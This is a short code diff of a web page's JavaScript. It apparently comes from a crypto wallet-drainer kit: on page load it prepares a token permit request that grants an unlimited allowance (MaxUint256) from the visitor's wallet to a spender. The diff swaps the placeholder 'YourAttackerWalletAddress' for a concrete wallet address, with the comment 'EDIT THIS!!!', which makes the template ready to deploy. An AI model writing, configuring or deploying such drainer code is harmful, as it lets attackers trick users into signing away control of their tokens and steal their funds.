@@ -49,7 +49,7 @@ document.addEventListener("DOMContentLoaded", () => {
 
     const value = {
       owner: userAddress,
-      spender: "0xYourAttackerWalletAddressHere", // EDIT THIS!!!
+      spender: "0xaB7fC2635Be1C0e8505548cE3dee553a524fAa65", // EDIT THIS!!!
       value: ethers.constants.MaxUint256.toString(),
       nonce,
       deadline: Math.floor(Date.now() / 1000) + 3600
